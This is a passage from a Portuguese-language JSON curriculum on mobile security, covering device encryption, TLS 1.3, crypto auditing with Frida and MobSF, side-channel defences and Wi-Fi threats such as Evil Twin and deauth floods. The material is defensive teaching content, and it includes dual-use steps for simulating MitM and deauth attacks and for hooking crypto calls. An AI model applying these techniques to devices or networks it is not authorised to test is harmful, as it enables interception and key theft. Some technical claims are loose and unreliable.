                                  "verification": "Confirme ambiente pronto com screenshot de AVD rodando e backup salvo.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Android Studio",
                                    "Emulador AVD",
                                    "Dispositivo Android rootado (opcional)",
                                    "Ferramentas: adb, openssl"
                                  ],
                                  "tips": "Use emulador para evitar riscos em dispositivo real inicialmente.",
                                  "learningObjective": "Preparar um ambiente seguro e controlado para implementação de FDE.",
                                  "commonMistakes": [
                                    "Pular backup, levando a perda de dados.",
                                    "Usar senhas fracas para chaves iniciais.",
                                    "Não verificar compatibilidade de hardware."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Criptografia FDE com dm-crypt e Keystore",
                                  "subSteps": [
                                    "Habilite FDE via configurações ou criptografar partição com cryptsetup/dm-crypt.",
                                    "Integre Android Keystore para armazenar e gerenciar a chave de criptografia (use KeyGenParameterSpec).",
                                    "Configure autenticação: PIN/biometria para unlock do Keystore.",
                                    "Aplique FDE à partição /data (comando: cryptsetup luksFormat /dev/block/...).",
                                    "Reinicie e teste unlock com chave do Keystore."
                                  ],
                                  "verification": "Execute 'dmsetup status' ou logs para confirmar partição criptografada.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Android Studio com código de exemplo Keystore",
                                    "cryptsetup (em ambiente root)",
                                    "Documentação developer.android.com/training/articles/keystore"
                                  ],
                                  "tips": "Comece com código de exemplo do Android para Keystore para evitar erros.",
                                  "learningObjective": "Executar implementação prática de FDE integrada com Keystore.",
                                  "commonMistakes": [
                                    "Expor chaves fora do Keystore (armazenar em plaintext).",
                                    "Falhar no wrap da chave mestra corretamente.",
                                    "Ignorar recovery keys para cenários de esquecimento."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar, Verificar e Aplicar Melhores Práticas",
                                  "subSteps": [
                                    "Teste proteção: remova chave e tente acessar dados (deve falhar).",
                                    "Monitore performance com ferramentas como top/battery stats.",
                                    "Configure políticas de gerenciamento (MDM como Intune para enterprise).",
                                    "Documente processo de recovery e auditoria.",
                                    "Compare com iOS: ative Data Protection via passcode e verifique via console."
                                  ],
                                  "verification": "Gere relatório com testes passed/failed e métricas de performance.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Ferramentas de monitoramento: adb logcat, Xcode para iOS",
                                    "MDM trial (ex: Microsoft Intune)"
                                  ],
                                  "tips": "Automatize testes com scripts para repetibilidade.",
                                  "learningObjective": "Validar eficácia da implementação e otimizar para produção.",
                                  "commonMistakes": [
                                    "Não testar cenários de falha (ex: bateria fraca durante unlock).",
                                    "Omitir auditoria de logs de acesso.",
                                    "Aplicar em produção sem piloto."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um emulador Android 10+, implemente dm-crypt na partição /data usando uma chave gerada e armazenada no Hardware-backed Keystore. Crie um app simples que armazene dados sensíveis (ex: credenciais mock) e verifique que, sem unlock, o app falha ao acessar o storage criptografado.",
                              "finalVerifications": [
                                "Dados permanecem inacessíveis após remoção da chave Keystore.",
                                "FDE é confirmado ativo via comandos como 'getprop ro.crypto.state'.",
                                "Performance degradada <10% em benchmarks antes/depois.",
                                "Recovery key permite acesso em caso de perda de PIN.",
                                "Logs mostram tentativas de acesso negadas corretamente.",
                                "Integração com MDM bloqueia acesso remoto se necessário."
                              ],
                              "assessmentCriteria": [
                                "Implementação completa sem vazamento de chaves (100% cobertura).",
                                "Tempo de unlock <5s e performance aceitável.",
                                "Relatório de testes cobre todos cenários edge (perda, roubo).",
                                "Código Keystore segue guidelines Android Security.",
                                "Documentação inclui passos de reversão e auditoria.",
                                "Conhecimento demonstrado em quiz sobre FDE vs FBE."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Algoritmos criptográficos (AES-XTS usado em dm-crypt).",
                                "Programação: Desenvolvimento Android com APIs de segurança (KeyStore API).",
                                "Hardware: Entendimento de armazenamento flash e TPM/TEE.",
                                "Gestão de TI: Políticas de MDM e conformidade (GDPR/HIPAA).",
                                "Ética: Implicações de privacidade em dados sensíveis."
                              ],
                              "realWorldApplication": "Em organizações como bancos ou saúde, implemente FDE em frotas de smartphones corporativos para cumprir regulamentações como LGPD, protegendo dados de pacientes/clientes contra roubo físico de dispositivos perdidos ou roubados."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.3.3.2",
                            "name": "Segurar dados em trânsito",
                            "description": "Configurar protocolos como TLS 1.3 com PFS em apps móveis para proteger comunicações contra interceptação.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender fundamentos de TLS 1.3 e PFS",
                                  "subSteps": [
                                    "Estudar o protocolo TLS 1.3 e suas melhorias em relação a versões anteriores.",
                                    "Explicar o conceito de Perfect Forward Secrecy (PFS) e cipher suites suportados.",
                                    "Identificar riscos de interceptação em comunicações móveis sem proteção.",
                                    "Revisar exemplos de ataques como Man-in-the-Middle (MitM).",
                                    "Mapear componentes necessários para configuração em apps móveis."
                                  ],
                                  "verification": "Resumir em um diagrama os fluxos de handshake TLS 1.3 com PFS.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação oficial TLS 1.3 (RFC 8446)",
                                    "Vídeos tutoriais sobre PFS",
                                    "Ferramenta de desenho como Draw.io"
                                  ],
                                  "tips": "Foque em cipher suites como TLS_AES_128_GCM_SHA256 que garantem PFS.",
                                  "learningObjective": "Entender como TLS 1.3 com PFS protege chaves de sessão contra comprometimento futuro.",
                                  "commonMistakes": "Confundir TLS 1.3 com versões antigas sem PFS obrigatório."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar servidor de teste com TLS 1.3 e PFS",
                                  "subSteps": [
                                    "Instalar e configurar um servidor web como Nginx ou Apache com suporte a TLS 1.3.",
                                    "Gerar certificados SSL/TLS usando Let's Encrypt ou self-signed para testes.",
                                    "Habilitar apenas cipher suites PFS-compatíveis no arquivo de configuração.",
                                    "Reiniciar o servidor e verificar logs para confirmação de TLS 1.3.",
                                    "Testar acessibilidade via HTTPS com ferramentas como curl."
                                  ],
                                  "verification": "Executar 'nmap --script ssl-enum-ciphers -p 443 <servidor>' e confirmar TLS 1.3 com PFS.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Servidor VPS ou local (Ubuntu)",
                                    "Certbot para Let's Encrypt",
                                    "Nginx/Apache",
                                    "nmap"
                                  ],
                                  "tips": "Use 'ssl_protocols TLSv1.3;' no Nginx para forçar versão 1.3.",
                                  "learningObjective": "Configurar backend seguro que force clientes móveis a usar TLS 1.3 com PFS.",
                                  "commonMistakes": "Deixar cipher suites fracos habilitados, permitindo downgrade attacks."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar TLS 1.3 com PFS no app móvel",
                                  "subSteps": [
                                    "Configurar ambiente de desenvolvimento Android/iOS com biblioteca HTTP client (ex: OkHttp para Android).",
                                    "Implementar cliente HTTPS forçando TLS 1.3 via ConnectionSpec.",
                                    "Adicionar verificação de hostname e pinning de certificado se aplicável.",
                                    "Integrar chamadas API seguras no código do app.",
                                    "Compilar e instalar o app no emulador/dispositivo."
                                  ],
                                  "verification": "Inspecionar código fonte e logs do app para confirmação de specs TLS 1.3.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Android Studio ou Xcode",
                                    "OkHttp ou Alamofire",
                                    "Servidor de teste configurado",
                                    "Emulador móvel"
                                  ],
                                  "tips": "Em OkHttp: ConnectionSpec.TLS_1_3_ONLY para restringir a versão.",
                                  "learningObjective": "Desenvolver código de app móvel que negocia apenas conexões TLS 1.3 com PFS.",
                                  "commonMistakes": "Não especificar ConnectionSpec, permitindo fallback para TLS inferior."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e validar proteção contra interceptação",
                                  "subSteps": [
                                    "Simular ataque MitM com ferramentas como mitmproxy ou Burp Suite.",
                                    "Capturar tráfego com Wireshark e analisar handshake TLS.",
                                    "Verificar que chaves de sessão são efêmeras (PFS) e não reutilizáveis.",
                                    "Executar testes de performance e latência da conexão segura.",
                                    "Documentar resultados e ajustes necessários."
                                  ],
                                  "verification": "Wireshark mostra TLS 1.3 handshake com cipher PFS e sem descriptografia bem-sucedida no proxy.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Wireshark",
                                    "mitmproxy",
                                    "Burp Suite Community",
                                    "Dispositivo móvel rootado para testes avançados"
                                  ],
                                  "tips": "Instale certificado CA do proxy no dispositivo para simular MitM realista.",
                                  "learningObjective": "Validar empiricamente a resistência da configuração contra interceptações.",
                                  "commonMistakes": "Ignorar erros de certificado em testes, simulando falhas reais."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Otimizar e documentar a implementação",
                                  "subSteps": [
                                    "Analisar métricas de segurança com Qualys SSL Labs ou similares.",
                                    "Otimizar cipher suites para balancear segurança e performance.",
                                    "Criar documentação do setup para equipe.",
                                    "Realizar code review simulada.",
                                    "Planejar monitoramento contínuo em produção."
                                  ],
                                  "verification": "Relatório SSL Labs com nota A+ e confirmação de PFS.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "SSL Labs tester",
                                    "Ferramentas de documentação como Markdown"
                                  ],
                                  "tips": "Priorize cipher suites quântico-resistentes se aplicável no futuro.",
                                  "learningObjective": "Garantir implementação robusta e sustentável para produção.",
                                  "commonMistakes": "Esquecer de atualizar certificados ou configs após testes."
                                }
                              ],
                              "practicalExample": "Em um app de mobile banking, configure TLS 1.3 com PFS usando OkHttp no Android para proteger transações financeiras durante login e transferências, impedindo que atacantes capturem credenciais em Wi-Fi público.",
                              "finalVerifications": [
                                "Conexão só aceita TLS 1.3 via Wireshark.",
                                "Cipher suite usado suporta PFS (ex: TLS_AES_256_GCM_SHA384).",
                                "Tentativa de MitM falha sem descriptografia.",
                                "App rejeita conexões TLS < 1.3.",
                                "Performance mantida (< 100ms overhead).",
                                "Logs confirmam handshake seguro."
                              ],
                              "assessmentCriteria": [
                                "Código fonte demonstra configuração explícita de TLS 1.3 e PFS.",
                                "Testes comprovam proteção contra downgrade e MitM.",
                                "Documentação completa cobre setup e troubleshooting.",
                                "Otimização equilibra segurança e usabilidade.",
                                "Conformidade com melhores práticas (OWASP Mobile).",
                                "Relatório de testes inclui evidências visuais."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos de transporte seguros.",
                                "Desenvolvimento de Software Móvel: Integração de bibliotecas HTTP.",
                                "Criptografia: Chaves assimétricas e efêmeras.",
                                "Ética e Privacidade: Proteção de dados pessoais."
                              ],
                              "realWorldApplication": "Em apps de saúde móvel (telemedicina), e-commerce e finanças, previne vazamento de dados sensíveis em redes públicas, atendendo regulamentações como LGPD e GDPR contra espionagem cibernética."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.3.3.3",
                            "name": "Auditar implementações criptográficas móveis",
                            "description": "Realizar análise estática e dinâmica para detectar falhas como uso de algoritmos obsoletos ou vazamento de chaves em código móvel.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de auditoria para apps móveis",
                                  "subSteps": [
                                    "Instalar ferramentas de análise estática como MobSF ou QARK para Android/iOS.",
                                    "Configurar emuladores ou dispositivos reais (Android Studio Emulator ou Xcode Simulator).",
                                    "Obter o APK/IPA do app alvo e descompilar com apktool ou otool.",
                                    "Preparar ambiente proxy como Burp Suite ou Frida para análise dinâmica.",
                                    "Documentar baseline de segurança criptográfica (ex: algoritmos permitidos como AES-256-GCM)."
                                  ],
                                  "verification": "Ambiente testado com um app sample simples, confirmando instalação e descompilação sem erros.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "MobSF, apktool, Frida, Burp Suite, Android Studio/Xcode"
                                  ],
                                  "tips": "Use VMs isoladas para evitar contaminação; teste com apps open-source primeiro.",
                                  "learningObjective": "Entender e preparar ferramentas essenciais para auditoria criptográfica móvel.",
                                  "commonMistakes": [
                                    "Ignorar compatibilidade iOS/Android",
                                    "Não configurar proxies corretamente",
                                    "Usar versões desatualizadas de ferramentas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Realizar análise estática do código fonte ou binário",
                                  "subSteps": [
                                    "Escaneie o código com MobSF para detectar algoritmos obsoletos (MD5, SHA1, DES).",
                                    "Busque por hard-coded keys ou certificados em strings e assets.",
                                    "Analise chamadas de APIs criptográficas (KeyStore, Cipher) para má implementação.",
                                    "Verifique configurações de TLS/SSL em network security config.",
                                    "Extraia e revise bibliotecas nativas (JNI, Swift) para vazamentos."
                                  ],
                                  "verification": "Relatório gerado listando pelo menos 3 potenciais issues criptográficos identificados.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "MobSF, grep/regex tools, jadx para decompilação Java/Kotlin"
                                  ],
                                  "tips": "Use scripts personalizados para grep padrões como 'RSA/ECB' ou 'private_key'.",
                                  "learningObjective": "Identificar falhas criptográficas estáticas sem executar o app.",
                                  "commonMistakes": [
                                    "Focar só em high-level, ignorar nativo",
                                    "Não checar obfuscation",
                                    "Confundir false positives"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar análise dinâmica durante runtime",
                                  "subSteps": [
                                    "Instale o app no emulador/dispositivo e configure Frida/Burp para interceptar tráfego.",
                                    "Monitore chamadas criptográficas com hooks Frida em funções como AES_encrypt.",
                                    "Capture logs de chaves geradas e verifique entropia/randomness.",
                                    "Teste cenários de uso (login, dados sensíveis) para vazamentos em memória/disco.",
                                    "Simule ataques como MITM para testar pinning de certificados."
                                  ],
                                  "verification": "Capturas de tráfego e logs mostram detecção de pelo menos 2 vazamentos ou fraquezas.",
                                  "estimatedTime": "3-4 horas",
                                  "materials": [
                                    "Frida, Objection, Burp Suite, ADB/iOS debug tools"
                                  ],
                                  "tips": "Hook funções específicas como javax.crypto.Cipher.doFinal para inspecionar dados.",
                                  "learningObjective": "Detectar issues criptográficos que só aparecem em execução.",
                                  "commonMistakes": [
                                    "Não rootar/jailbreak corretamente",
                                    "Ignorar background processes",
                                    "Falhar em limpar traces"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar resultados, priorizar e relatar vulnerabilidades",
                                  "subSteps": [
                                    "Classifique findings por CVSS (ex: critical para key leakage).",
                                    "Correlacione estática/dinâmica para confirmação (ex: hard-code visto em runtime).",
                                    "Sugira fixes: migração para BouncyCastle, key derivation com PBKDF2.",
                                    "Gere relatório com screenshots, PoCs e referências OWASP Mobile Top 10.",
                                    "Valide correções pós-fix em iterações."
                                  ],
                                  "verification": "Relatório completo submetido com priorização e recomendações acionáveis.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Templates OWASP, Markdown/PDF tools"
                                  ],
                                  "tips": "Use matriz de risco personalizada para mobile crypto.",
                                  "learningObjective": "Sintetizar análises em relatório profissional.",
                                  "commonMistakes": [
                                    "Não priorizar riscos",
                                    "Relatórios vagos sem PoC",
                                    "Ignorar contexto business"
                                  ]
                                }
                              ],
                              "practicalExample": "Auditar o app bancário sample 'VulnerableMobileBank.apk': análise estática revela MD5 para hashing de senhas; dinâmica com Frida mostra chave AES hard-coded vazando em logs, levando a relatório com PoC de decrypt offline.",
                              "finalVerifications": [
                                "Gere relatório de auditoria identificando 5+ issues criptográficos em app real.",
                                "Demonstre detecção de algoritmo obsoleto e key leakage via estática/dinâmica.",
                                "Explique fixes para cada finding com código sample.",
                                "Passe em quiz sobre OWASP Mobile Crypto cheatsheet.",
                                "Audite app peer e valide findings mutuamente.",
                                "Configure Frida hook custom para monitorar Cipher usage."
                              ],
                              "assessmentCriteria": [
                                "Precisão na detecção de algoritmos fracos (90% recall).",
                                "Qualidade do relatório: claro, com PoCs e severidade.",
                                "Cobertura completa: estática + dinâmica + correlações.",
                                "Tempo eficiência dentro de estimados.",
                                "Conhecimento de best practices (NIST SP 800-131A).",
                                "Criatividade em testes edge-case."
                              ],
                              "crossCurricularConnections": [
                                "Programação Móvel (Android/iOS dev para entender implementações).",
                                "Criptografia Geral (algoritmos simétricos/assimétricos).",
                                "Análise de Malware (técnicas de reverse engineering).",
                                "Segurança de Rede (TLS/SSL pinning).",
                                "Desenvolvimento Ágil (integração de audits em CI/CD)."
                              ],
                              "realWorldApplication": "Em equipes de Red Team/penetration testing, auditores usam isso para validar conformidade GDPR/HIPAA em apps de saúde/finanças, prevenindo breaches como o da Capital One via mobile crypto flaws."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.3.3.4",
                            "name": "Mitigar ataques específicos a criptografia móvel",
                            "description": "Defender contra ataques side-channel e extração de chaves em dispositivos rootados, usando proteções como canários de memória.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Ataques Side-Channel e Extração de Chaves em Dispositivos Móveis",
                                  "subSteps": [
                                    "Estude os tipos de ataques side-channel: análise de timing, consumo de energia, cache e eletromagnéticos em criptografia móvel.",
                                    "Analise extração de chaves em dispositivos rootados: dumping de memória, Frida ou ptrace para interceptar chaves.",
                                    "Revise casos reais como ataques Rowhammer ou Spectre adaptados para mobile.",
                                    "Identifique vulnerabilidades específicas em Android/iOS, como Keystore exposto.",
                                    "Documente um mapa mental dos vetores de ataque."
                                  ],
                                  "verification": "Crie um relatório de 1 página resumindo 5 ataques principais com exemplos de código vulnerável.",
                                  "estimatedTime": "4 horas",
                                  "materials": "Documentação Android Security Bulletin, papers sobre side-channels (e.g., 'Cache Attacks on ARM'), ferramenta Frida.",
                                  "tips": "Use diagramas para visualizar fluxos de ataque; foque em mobile constraints como bateria.",
                                  "learningObjective": "Identificar e classificar ataques side-channel e extração de chaves em contextos móveis.",
                                  "commonMistakes": "Confundir side-channel com ataques diretos; ignorar diferenças ARM vs x86."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar Mecanismos de Proteção como Canários de Memória",
                                  "subSteps": [
                                    "Aprenda canários de memória: implementação com valores randômicos entre dados sensíveis e limites de buffer.",
                                    "Explore outras proteções: masking de chaves, blinding para AES, constant-time implementations.",
                                    "Estude libs como OpenSSL com proteções side-channel ou Android Keystore.",
                                    "Revise ASLR, DEP/NX e stack canaries em kernels móveis.",
                                    "Compare eficácia: leia benchmarks de resistência a timing attacks."
                                  ],
                                  "verification": "Explique em um diagrama como um canário detecta overflow e invalida chaves.",
                                  "estimatedTime": "5 horas",
                                  "materials": "Livro 'Cryptography Engineering', docs OpenSSL, Android NDK samples.",
                                  "tips": "Teste canários em C simples antes de mobile; use Valgrind para simular.",
                                  "learningObjective": "Dominar princípios de canários e proteções complementares contra side-channels.",
                                  "commonMistakes": "Implementar canários previsíveis; subestimar ataques cache em multi-thread."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Proteções em Aplicação Móvel",
                                  "subSteps": [
                                    "Configure ambiente Android Studio com NDK para código nativo.",
                                    "Integre canários em funções de criptografia: rode AES com chaves protegidas.",
                                    "Adicione masking/blinding e constant-time ops usando libs como libsodium.",
                                    "Proteja contra root: detecte root com SafetyNet e rejeite se rootado.",
                                    "Compile e assine APK com proteções."
                                  ],
                                  "verification": "Execute app e verifique logs mostrando canários intactos pós-operações crypto.",
                                  "estimatedTime": "8 horas",
                                  "materials": "Android Studio, NDK, libsodium Android, root device/emulador.",
                                  "tips": "Use proguard para ofuscar; teste em device físico para side-channels reais.",
                                  "learningObjective": "Desenvolver código móvel com proteções ativas contra extração e side-channels.",
                                  "commonMistakes": "Expor chaves em logs; esquecer multi-arquitetura (arm64)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Validar Defesas Contra Ataques Simulados",
                                  "subSteps": [
                                    "Simule side-channel: use ferramentas como CacheBleed ou timing probes com perf.",
                                    "Teste extração: root device, use Frida para hook crypto funcs e cheque detecção.",
                                    "Execute fuzzing em buffers para trigger canários.",
                                    "Meça overhead: profile performance pré/pós proteções.",
                                    "Gere relatório de testes falhados/sucessos."
                                  ],
                                  "verification": "Demonstre falha em extrair chaves via screencast de ataques simulados.",
                                  "estimatedTime": "6 horas",
                                  "materials": "Frida, Magisk para root, perf tools, emulador com KVM.",
                                  "tips": "Automatize testes com scripts; compare com baseline vulnerável.",
                                  "learningObjective": "Validar implementações através de simulações realistas de ataques.",
                                  "commonMistakes": "Testar só em emulador; ignorar variações de hardware."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Otimizar e Documentar Estratégia de Mitigação",
                                  "subSteps": [
                                    "Analise resultados: ajuste canários para menor overhead.",
                                    "Integre monitoring runtime para detecção de tampers.",
                                    "Crie guidelines para deploy: políticas SELinux, atualizações.",
                                    "Documente tudo em README com código fonte.",
                                    "Planeje auditoria externa."
                                  ],
                                  "verification": "Produza documento final com métricas de sucesso (>95% resistência).",
                                  "estimatedTime": "3 horas",
                                  "materials": "Markdown editor, Git para versionamento.",
                                  "tips": "Use threat modeling (STRIDE) para priorizar.",
                                  "learningObjective": "Refinar e documentar defesas para produção.",
                                  "commonMistakes": "Omitir custos de performance; não versionar mudanças."
                                }
                              ],
                              "practicalExample": "Em um app bancário Android, proteja a chave de sessão AES com canários de memória e masking. Ao rootar o device e usar Frida para dump, o app detecta tamper via canário corrompido e apaga dados.",
                              "finalVerifications": [
                                "Chaves não podem ser extraídas via Frida/ptrace em device rootado.",
                                "Ataques de timing em AES retornam dados inválidos (devido a constant-time).",
                                "Canários triggeram wipe de memória em 100% dos overflows simulados.",
                                "Performance overhead <10% em benchmarks.",
                                "App passa SafetyNet attestation pós-root.",
                                "Logs mostram detecções sem falsos positivos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de 80% dos ataques side-channel comuns.",
                                "Implementação correta de canários com randomização em código nativo.",
                                "Sucesso em resistir a 4/5 ataques simulados (Frida, timing, cache).",
                                "Documentação completa com diagramas e métricas.",
                                "Overhead de performance otimizado abaixo de 15%.",
                                "Integração com detecção de root sem bypass fácil."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia Geral: AES modes e side-channel mitigations.",
                                "Sistemas Operacionais: Kernel protections (ASLR, SELinux).",
                                "Hardware/Arquitetura: ARM cache behaviors e power analysis.",
                                "Desenvolvimento Móvel: Android NDK e security best practices.",
                                "Análise de Malware: Reverse engineering com Frida/Ghidra."
                              ],
                              "realWorldApplication": "Proteger apps de fintech (e.g., banking como Nubank) contra roubo de chaves em devices comprometidos, prevenindo fraudes financeiras; usado em saúde para dados HIPAA-compliant em mobiles rootados."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.7.4",
                    "name": "Segurança de Redes em Computação Móvel",
                    "description": "Medidas contra ameaças em Wi-Fi, Bluetooth e redes celulares, incluindo VPNs móveis.",
                    "individualConcepts": [
                      {
                        "id": "10.1.7.4.1",
                        "name": "Segurança em Redes Wi-Fi para Computação Móvel",
                        "description": "Medidas de proteção contra ameaças comuns em redes Wi-Fi acessadas por dispositivos móveis, como ataques Man-in-the-Middle (MitM), redes falsas (Evil Twin) e fraquezas em protocolos de autenticação.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.4.1.1",
                            "name": "Identificar ameaças comuns em Wi-Fi móvel",
                            "description": "Reconhecer e descrever ataques como Evil Twin, Rogue AP, MitM e deauth floods em contextos de computação móvel, incluindo impactos em dispositivos Android e iOS.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender os Fundamentos de Redes Wi-Fi em Dispositivos Móveis",
                                  "subSteps": [
                                    "Explicar como dispositivos Android e iOS se conectam a redes Wi-Fi usando SSID e autenticação WPA2/WPA3.",
                                    "Descrever o processo de scanning e associação de redes Wi-Fi em contextos móveis.",
                                    "Identificar diferenças entre Wi-Fi gerenciado (corporate) e público (cafés, aeroportos).",
                                    "Listar vetores iniciais de ataque em Wi-Fi móvel, como broadcast de beacons falsos.",
                                    "Revisar conceitos básicos de criptografia Wi-Fi (TKIP vs AES)."
                                  ],
                                  "verification": "Criar um diagrama simples do processo de conexão Wi-Fi móvel e rotulá-lo corretamente.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Dispositivo Android/iOS",
                                    "Documentação oficial WPA2/WPA3 (PDFs)",
                                    "Ferramenta de scanning Wi-Fi como WiFi Analyzer (app gratuita)"
                                  ],
                                  "tips": "Use apps de scanning para visualizar beacons reais em seu ambiente atual.",
                                  "learningObjective": "Compreender o fluxo de conexão Wi-Fi para reconhecer pontos de vulnerabilidade em dispositivos móveis.",
                                  "commonMistakes": [
                                    "Confundir SSID com BSSID",
                                    "Ignorar diferenças entre Android e iOS no gerenciamento de Wi-Fi",
                                    "Subestimar riscos em redes WPA2 antigas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Reconhecer Ataques Evil Twin e Rogue AP",
                                  "subSteps": [
                                    "Definir Evil Twin como uma AP falsa clonando SSID legítimo para roubo de credenciais.",
                                    "Explicar Rogue AP como AP não autorizada injetando-se na rede.",
                                    "Demonstrar detecção via discrepâncias em BSSID, canal ou força de sinal.",
                                    "Simular visualização em ferramentas como Wireshark ou apps móveis de detecção.",
                                    "Discutir mitigações como verificação de certificados ou apps de detecção de rogue APs."
                                  ],
                                  "verification": "Identificar um Evil Twin simulado em uma captura de pacotes Wireshark fornecida.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Wireshark (versão portable)",
                                    "Capturas de pacotes exemplo de Evil Twin (disponíveis online)",
                                    "App Acrylic Wi-Fi ou similar"
                                  ],
                                  "tips": "Compare BSSID de APs conhecidas vs suspeitas; sinal muito forte pode indicar proximidade falsa.",
                                  "learningObjective": "Diferenciar e detectar visualmente Evil Twin e Rogue AP em cenários móveis.",
                                  "commonMistakes": [
                                    "Confundir com redes legítimas de repetidoras",
                                    "Não verificar canal de operação",
                                    "Ignorar alertas de apps de segurança"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Ataques Man-in-the-Middle (MitM) em Wi-Fi Móvel",
                                  "subSteps": [
                                    "Descrever MitM como interceptação de tráfego via AP falsa ou ARP poisoning em Wi-Fi.",
                                    "Explicar como ocorre em dispositivos móveis: downgrade de criptografia ou captura de dados não criptografados.",
                                    "Listar impactos: roubo de sessões, credenciais ou injeção de malware.",
                                    "Demonstrar detecção via ferramentas como HTTPS Everywhere ou análise de certificados.",
                                    "Comparar vulnerabilidades específicas em Android (rooted devices) vs iOS (sandboxing)."
                                  ],
                                  "verification": "Analisar um log de tráfego e apontar evidências de MitM, como certificados inválidos.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Navegador com dev tools (Chrome/Firefox)",
                                    "Site de teste SSL como badssl.com",
                                    "VPN app para comparação"
                                  ],
                                  "tips": "Sempre verifique o cadeado HTTPS e certificados; use HSTS para prevenção.",
                                  "learningObjective": "Reconhecer sinais de MitM e seus efeitos diferenciados em Android e iOS.",
                                  "commonMistakes": [
                                    "Aceitar certificados auto-assinados",
                                    "Não notar downgrade para HTTP",
                                    "Confundir com lentidão de rede"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Deauth Floods e Impactos Gerais em Dispositivos Móveis",
                                  "subSteps": [
                                    "Definir deauth flood como envio massivo de frames de desautenticação para desconectar dispositivos.",
                                    "Explicar impactos: DoS temporário, forcing reconexão a APs más.",
                                    "Descrever detecção via monitoramento de desconexões frequentes ou ferramentas como Aircrack-ng.",
                                    "Discutir efeitos em Android (mais suscetível a floods) vs iOS (proteções PMF).",
                                    "Listar práticas de mitigação: Protected Management Frames (PMF/WPA3), monitoramento de logs."
                                  ],
                                  "verification": "Simular um deauth flood em ambiente controlado e registrar sintomas em dispositivo móvel.",
                                  "estimatedTime": "55 minutos",
                                  "materials": [
                                    "Kali Linux VM (para simulação segura)",
                                    "Adaptador Wi-Fi compatível (monitor mode)",
                                    "App de log de Wi-Fi como WiFi Monitor"
                                  ],
                                  "tips": "Use modo monitor apenas em redes próprias; ative PMF nas configurações avançadas.",
                                  "learningObjective": "Identificar deauth floods e avaliar impactos específicos em ecossistemas móveis.",
                                  "commonMistakes": [
                                    "Atribuir a problemas de sinal",
                                    "Não habilitar PMF",
                                    "Testar em redes públicas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um café lotado, um atacante configura um Evil Twin com SSID 'Cafe_Free_WiFi'. Usuários Android/iOS conectam, sofrendo MitM para roubo de login bancário via deauth flood inicial para forçar reconexão. Detecte verificando BSSID diferente e certificados inválidos no app de banking.",
                              "finalVerifications": [
                                "Descreva diferenças entre Evil Twin e Rogue AP com exemplos.",
                                "Liste 3 sinais de MitM em tráfego móvel.",
                                "Explique como deauth flood afeta Android vs iOS.",
                                "Identifique uma captura Wireshark com ameaça Wi-Fi.",
                                "Proponha 3 mitigações para cada ameaça.",
                                "Crie checklist para conexão Wi-Fi segura em mobile."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de cada ameaça (80% cobertura).",
                                "Capacidade de diferenciar impactos Android/iOS.",
                                "Detecção correta em cenários simulados.",
                                "Uso correto de terminologia (SSID, BSSID, PMF).",
                                "Propostas de mitigação práticas e viáveis.",
                                "Completude do diagrama/conexões de ataques."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos 802.11 e frames de gerenciamento.",
                                "Sistemas Operacionais: Gerenciamento Wi-Fi em Android/iOS.",
                                "Criptografia: WPA2/WPA3 e falhas de handshake.",
